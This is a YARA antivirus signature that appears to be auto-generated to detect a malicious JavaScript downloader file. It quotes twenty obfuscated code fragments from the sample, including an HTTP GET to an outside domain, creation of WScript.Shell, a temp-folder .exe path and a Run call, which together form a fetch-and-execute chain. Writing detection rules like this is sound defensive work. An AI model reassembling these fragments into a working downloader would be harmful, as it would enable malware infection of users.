rule sig_20160330_18305bac4be18369c6ba97b2b706d474 {
  meta:
    description = "datamaliciousorder - file 20160330_18305bac4be18369c6ba97b2b706d474.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9a07dc6fecd5e7170656c53b7d45baeba1d4d7127015218f4d9c5cb48da0b1fa"

  strings:
    $s1  = "_H[_AT](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "var _ZE = function _EP() {return WScript[_WY](\"WScript\"+\".Shell\");}(), _B0 = 11;" fullword ascii
    $s3  = "function _YP(_B1, _AH){_W = _W * 1; return _B1 - _AH;};" fullword ascii
    $s4  = "if (_H[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _YD() {return _ZE[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1YiXtFK70ewWIsf.ex\" + \"e\";};" fullword ascii
    $s6  = "function _PV(){return _FY + \"\";};" fullword ascii
    $s7  = "function _Y() {return ((_GK == true) && (_GK == _XI)) ? 1 : _W;};" fullword ascii
    $s8  = "function _BR(_K){_ZE[\"Run\"](_K, _W, _W);};" fullword ascii
    $s9  = "function _BE()" fullword ascii
    $s10 = "function _J(){return 22;};" fullword ascii
    $s11 = " while (_FA){" fullword ascii
    $s12 = "var _NU = new this[\"Date\"]();" fullword ascii
    $s13 = "return _YP(_D, _FG);" fullword ascii
    $s14 = "function _E(){return _WY;};" fullword ascii
    $s15 = "function _L(_I) {var _EB = (1, 2, 3, 4, 5, _I); return _EB;};" fullword ascii
    $s16 = "var _GK = false;" fullword ascii
    $s17 = "_GK = true; " fullword ascii
    $s18 = "var _XI = false;" fullword ascii
    $s19 = "var _WZ0 = false;" fullword ascii
    $s20 = "_XI = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}